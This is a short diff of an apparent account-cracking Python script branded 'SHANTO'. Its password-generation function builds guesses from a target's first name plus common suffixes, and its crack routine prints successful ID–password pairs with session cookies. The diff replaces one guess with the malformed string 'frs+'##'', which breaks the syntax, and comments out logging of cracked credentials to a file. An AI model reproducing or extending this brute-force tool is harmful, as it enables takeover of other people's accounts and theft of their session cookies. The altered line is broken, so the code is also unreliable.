@@ -429,7 +429,7 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(nmf)
-					pwv.append('57273200')
+					pwv.append('frs+'##')
 					pwv.append(frs+'@')
 					pwv.append(frs+'@123')
 					pwv.append(frs+'@@')
@@ -448,7 +448,7 @@ def passwrd():
 					pwv.append(frs+'1234')
 					pwv.append(frs+'12345')
 					pwv.append(nmf)
-					pwv.append('57273200')
+					pwv.append('frs+'##')
 					pwv.append(frs+'@')
 					pwv.append(frs+'@123')
 					pwv.append(frs+'@@')
@@ -490,7 +490,7 @@ def crack(idf,pwv):
 				#SHANTO-King
 				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
 				os.system('espeak -a 300 " C,  P"')
-			    open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
+			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
